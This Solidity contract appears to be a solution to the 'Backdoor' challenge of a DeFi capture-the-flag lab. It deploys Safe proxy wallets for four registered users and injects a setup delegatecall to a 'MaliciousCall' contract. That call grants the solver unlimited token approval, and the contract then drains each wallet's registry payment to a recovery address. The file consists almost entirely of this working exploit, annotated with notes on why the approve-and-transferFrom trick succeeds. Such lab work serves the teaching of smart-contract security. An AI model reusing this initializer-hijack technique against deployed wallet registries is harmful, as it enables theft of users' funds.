// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract BackdoorSolve {

    address player;
    address recovery;
    
    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 private constant PAYMENT_AMOUNT = 10e18;

    constructor(DamnValuableToken _token, 
                Safe _singletonCopy, 
                SafeProxyFactory _walletFactory, 
                WalletRegistry _WalletRegistry,
                address _player,
                address _recovery
                ) 
    {
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _WalletRegistry;
        player = _player;
        recovery = _recovery;
    }

    function solve() public {
        uint256 threshold = 1;
        
        address[4] memory users = [
            0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, // Alice
            0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, // Bob
            0xea475d60c118d7058beF4bDd9c32bA51139a74e0, // Charlie
            0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b  // David
        ];
        
        MaliciousCall maliciousCall = new MaliciousCall();

        for (uint256 i = 0; i < 4; i++) {
            
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                threshold,
                address(maliciousCall),         
                abi.encodeCall(maliciousCall.approveTokens, 
                            (token, address(this))),        // Why not (token, address(recovery))? See Note
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            SafeProxy tmp = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                0,
                walletRegistry
            );


            // Note: Why didnt we use token.transferFrom(address(tmp), address(recovery), PAYMENT_AMOUNT)
            // Because the internal implementation, one calls approve allow spender to use that amount of token freely
            // So the spender can call transferFrom or transfer to use it
            // This case, recovery is not the one calling transferFrom, its this contract
            // Hence we need to set address(this) as spender 
            token.transferFrom(address(tmp), address(this), PAYMENT_AMOUNT);
        }

        token.approve(recovery, AMOUNT_TOKENS_DISTRIBUTED);
        token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract MaliciousCall {
    function approveTokens(DamnValuableToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}